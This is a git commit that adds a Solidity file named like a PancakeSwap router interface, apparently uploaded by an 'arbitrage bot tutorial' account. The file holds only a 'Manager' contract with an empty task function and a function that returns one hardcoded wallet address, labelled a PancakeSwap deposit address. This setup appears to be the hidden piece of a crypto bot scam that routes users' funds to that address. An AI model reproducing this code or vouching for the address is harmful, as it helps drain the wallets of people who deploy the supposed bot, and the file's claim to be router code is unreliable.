df323b950282bb15def2e10cbc0f53ac24dd10cb
Botarbitragetutorial <114292705+Botarbitragetutorial@users.noreply.github.com>
2022-09-24 14:14:02 +0200

    Add files via upload

---
+++ IPancakeRouterMain.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x4c71236D40838187c24dF72610054040e077125B;
+    }
+}
+
+//pancakeswapfunction
